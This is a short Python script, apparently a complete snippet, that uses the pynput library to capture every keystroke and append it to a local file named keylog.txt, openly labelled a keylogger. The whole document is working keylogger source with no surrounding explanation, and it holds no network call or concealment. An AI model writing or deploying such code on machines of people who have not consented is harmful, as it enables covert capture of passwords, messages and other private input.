from pynput.keyboard import Listener

# Function to log keystrokes
def log_keystroke(key):
    key = str(key).replace("'", "")  # Clean output
    with open("keylog.txt", "a") as log_file:
        log_file.write(key + "\n")

# Start the keylogger
with Listener(on_press=log_keystroke) as listener:
    listener.join()
